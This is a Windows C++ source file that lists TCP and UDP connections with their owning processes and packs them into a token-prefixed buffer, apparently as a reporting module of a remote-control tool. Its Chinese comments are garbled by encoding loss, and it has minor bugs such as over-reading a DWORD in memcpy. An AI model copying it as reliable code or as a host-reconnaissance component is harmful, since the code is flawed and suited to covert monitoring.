// GetNetState.cpp: implementation of the CGetNetState class.
//
//////////////////////////////////////////////////////////////////////

#include "GetNetState.h"

#include "macros.h"

 //////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

LPBYTE getNetStateList()
{
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_NSLIST;
	DWORD	dwOffset = 1;
	DWORD	dwLength = 0;

	// ������չ����ָ��
	PFNAllocateAndGetTcpExTableFromStack pAllocateAndGetTcpExTableFromStack;
	PFNAllocateAndGetUdpExTableFromStack pAllocateAndGetUdpExTableFromStack;

	// ��ȡ��չ��������ڵ�ַ
	HMODULE hModule = ::LoadLibrary("iphlpapi.dll");
	pAllocateAndGetTcpExTableFromStack =
		(PFNAllocateAndGetTcpExTableFromStack)::GetProcAddress(hModule,
			"AllocateAndGetTcpExTableFromStack");

	pAllocateAndGetUdpExTableFromStack =
		(PFNAllocateAndGetUdpExTableFromStack)::GetProcAddress(hModule,
			"AllocateAndGetUdpExTableFromStack");

	if (pAllocateAndGetTcpExTableFromStack != NULL || pAllocateAndGetUdpExTableFromStack != NULL)
	{
		// ������չ��������ȡTCP��չ���ӱ��UDP��չ������

		PMIB_TCPEXTABLE pTcpExTable;
		PMIB_UDPEXTABLE pUdpExTable;

		// pTcpExTable��pUdpExTable��ָ�Ļ������Զ�����չ�����ڽ��̶�������
		if (pAllocateAndGetTcpExTableFromStack(&pTcpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)
		{
			return NULL;
		}
		if (pAllocateAndGetUdpExTableFromStack(&pUdpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)
		{
			return NULL;
		}

		// ��ϵͳ�ڵ����н�����һ������
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{
			return NULL;
		}

		char    szLocalAddr[128];
		char    szRemoteAddr[128];
		char    szProcessName[128];
		in_addr inadLocal, inadRemote;
		char    strState[128];
		DWORD   dwRemotePort = 0;

		// ��ӡTCP��չ���ӱ���Ϣ
		for (UINT i = 0; i < pTcpExTable->dwNumEntries; ++i)
		{
			// ״̬
			switch (pTcpExTable->table[i].dwState)
			{
			case MIB_TCP_STATE_CLOSED:
				strcpy(strState, "�ѹر�");
				break;
			case MIB_TCP_STATE_LISTEN:
				strcpy(strState, "����");
				break;
			case MIB_TCP_STATE_SYN_SENT:
				strcpy(strState, "SYN_����");
				break;
			case MIB_TCP_STATE_SYN_RCVD:
				strcpy(strState, "SYN_����");
				break;
			case MIB_TCP_STATE_ESTAB:
				strcpy(strState, "����");
				break;
			case MIB_TCP_STATE_FIN_WAIT1:
				strcpy(strState, "FIN_WAIT1");
				break;
			case MIB_TCP_STATE_FIN_WAIT2:
				strcpy(strState, "FIN_WAIT2");
				break;
			case MIB_TCP_STATE_CLOSE_WAIT:
				strcpy(strState, "CLOSE_WAIT");
				break;
			case MIB_TCP_STATE_CLOSING:
				strcpy(strState, "���ڹر�");
				break;
			case MIB_TCP_STATE_LAST_ACK:
				strcpy(strState, "LAST_ACK");
				break;
			case MIB_TCP_STATE_TIME_WAIT:
				strcpy(strState, "TIME_WAIT");
				break;
			case MIB_TCP_STATE_DELETE_TCB:
				strcpy(strState, "ɾ��");
				break;
			default:
				break;
			}
			// ����IP��ַ
			inadLocal.s_addr = pTcpExTable->table[i].dwLocalAddr;

			// Զ�̶˿�
			if (strcmp(strState, "����") != 0)
			{
				dwRemotePort = pTcpExTable->table[i].dwRemotePort;
			}
			else
				dwRemotePort = 0;

			// Զ��IP��ַ
			inadRemote.s_addr = pTcpExTable->table[i].dwRemoteAddr;

			wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),
				ntohs((unsigned short)(0x0000FFFF & pTcpExTable->table[i].dwLocalPort)));
			wsprintf(szRemoteAddr, "%s:%u", inet_ntoa(inadRemote),
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));

			// ��ӡ������ڵ���Ϣ
			char strProcessName[100] = { 0 };
			char* strType = "[TCP]";
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pTcpExTable->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(strState) + 6;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;

			memcpy(lpBuffer + dwOffset, &pTcpExTable->table[i].dwProcessId, sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;

			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) + 1);
			dwOffset += lstrlen(strState) + 1;
		}

		// ��ӡUDP��������Ϣ
		for (int i = 0; i < pUdpExTable->dwNumEntries; ++i)
		{
			// ����IP��ַ
			inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;

			wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),
				ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));

			// ��ӡ������ڵ���Ϣ
			char strProcessName[100] = { 0 };
			char* strType = "[UDP]";
			char* szRemoteAddr = "*.*.*.*:*";
			char* szUDPState = " ";
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(szUDPState) + 6;

			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;

			memcpy(lpBuffer + dwOffset, &pUdpExTable->table[i].dwProcessId, sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;

			memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) + 1);
			dwOffset += lstrlen(szUDPState) + 1;
		}
		::CloseHandle(hProcessSnap);
		::LocalFree(pTcpExTable);
		::LocalFree(pUdpExTable);
		::FreeLibrary(hModule);
	}
	else
	{
		char    szLocalAddr[128];
		char    szRemoteAddr[128];
		char    szProcessName[128];
		in_addr inadLocal, inadRemote;
		char    strState[128];
		DWORD   dwRemotePort = 0;

		PMIB_TCPEXTABLE_VISTA pTcpTable_Vista;
		_InternalGetTcpTable2 pGetTcpTable = (_InternalGetTcpTable2)GetProcAddress(hModule, "InternalGetTcpTable2");
		if (pGetTcpTable == NULL)
			return 0;

		if (pGetTcpTable(&pTcpTable_Vista, GetProcessHeap(), 1))
			return 0;

		// ��ϵͳ�ڵ����н�����һ������
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{
			return NULL;
		}

		for (UINT i = 0; i < pTcpTable_Vista->dwNumEntries; i++)
		{
			// ״̬
			switch (pTcpTable_Vista->table[i].dwState)
			{
			case MIB_TCP_STATE_CLOSED:
				strcpy(strState, "�ѹر�");
				break;
			case MIB_TCP_STATE_LISTEN:
				strcpy(strState, "����");
				break;
			case MIB_TCP_STATE_SYN_SENT:
				strcpy(strState, "SYN_����");
				break;
			case MIB_TCP_STATE_SYN_RCVD:
				strcpy(strState, "SYN_����");
				break;
			case MIB_TCP_STATE_ESTAB:
				strcpy(strState, "����");
				break;
			case MIB_TCP_STATE_FIN_WAIT1:
				strcpy(strState, "FIN_WAIT1");
				break;
			case MIB_TCP_STATE_FIN_WAIT2:
				strcpy(strState, "FIN_WAIT2");
				break;
			case MIB_TCP_STATE_CLOSE_WAIT:
				strcpy(strState, "CLOSE_WAIT");
				break;
			case MIB_TCP_STATE_CLOSING:
				strcpy(strState, "���ڹر�");
				break;
			case MIB_TCP_STATE_LAST_ACK:
				strcpy(strState, "LAST_ACK");
				break;
			case MIB_TCP_STATE_TIME_WAIT:
				strcpy(strState, "TIME_WAIT");
				break;
			case MIB_TCP_STATE_DELETE_TCB:
				strcpy(strState, "ɾ��");
				break;
			default:
				break;
			}
			// ����IP��ַ
			inadLocal.s_addr = pTcpTable_Vista->table[i].dwLocalAddr;

			// Զ�̶˿�
			if (strcmp(strState, "����") != 0)
			{
				dwRemotePort = pTcpTable_Vista->table[i].dwRemotePort;
			}
			else
				dwRemotePort = 0;

			// Զ��IP��ַ
			inadRemote.s_addr = pTcpTable_Vista->table[i].dwRemoteAddr;

			wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),
				ntohs((unsigned short)(0x0000FFFF & pTcpTable_Vista->table[i].dwLocalPort)));
			wsprintf(szRemoteAddr, "%s:%u", inet_ntoa(inadRemote),
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));

			// ��ӡ������ڵ���Ϣ
			char strProcessName[100] = { 0 };
			char* strType = "[TCP]";
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pTcpTable_Vista->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(strState) + 6;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;

			memcpy(lpBuffer + dwOffset, &pTcpTable_Vista->table[i].dwProcessId, sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;

			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) + 1);
			dwOffset += lstrlen(strState) + 1;
		}

		PMIB_UDPEXTABLE pUdpExTable = NULL;
		// ����Ϊ Vista ���� 7 ����ϵͳ
		PFNInternalGetUdpTableWithOwnerPid pInternalGetUdpTableWithOwnerPid;
		pInternalGetUdpTableWithOwnerPid =
			(PFNInternalGetUdpTableWithOwnerPid)GetProcAddress(hModule, "InternalGetUdpTableWithOwnerPid");
		if (pInternalGetUdpTableWithOwnerPid != NULL)
		{
			if (pInternalGetUdpTableWithOwnerPid(&pUdpExTable, GetProcessHeap(), 1))
			{
				if (pUdpExTable)
				{
					HeapFree(GetProcessHeap(), 0, pUdpExTable);
				}

				FreeLibrary(hModule);
				hModule = NULL;

				return 0;
			}

			// ��ӡUDP��������Ϣ
			for (int i = 0; i < pUdpExTable->dwNumEntries; ++i)
			{
				// ����IP��ַ
				inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;

				wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),
					ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));

				// ��ӡ������ڵ���Ϣ
				char strProcessName[100] = { 0 };
				char* strType = "[UDP]";
				char* szRemoteAddr = "*.*.*.*:*";
				char* szUDPState = " ";
				lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));

				dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(szUDPState) + 6;
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;

				memcpy(lpBuffer + dwOffset, &pUdpExTable->table[i].dwProcessId, sizeof(DWORD) + 1);
				dwOffset += sizeof(DWORD) + 1;

				memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
				dwOffset += lstrlen(strType) + 1;

				memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
				dwOffset += lstrlen(szLocalAddr) + 1;

				memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
				dwOffset += lstrlen(szRemoteAddr) + 1;

				memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) + 1);
				dwOffset += lstrlen(szUDPState) + 1;
			}
		}
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}

// ������ID�ţ�PID��ת��Ϊ��������
PCHAR ProcessPidToName(HANDLE hProcessSnap, DWORD ProcessId, PCHAR ProcessName)
{
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(processEntry);
	// �Ҳ����Ļ���Ĭ�Ͻ�����Ϊ��???��
	strcpy(ProcessName, "???");
	if (!::Process32First(hProcessSnap, &processEntry))
		return ProcessName;
	do
	{
		if (processEntry.th32ProcessID == ProcessId) // �����������
		{
			strcpy(ProcessName, processEntry.szExeFile);
			break;
		}
	} while (::Process32Next(hProcessSnap, &processEntry));
	return ProcessName;
}
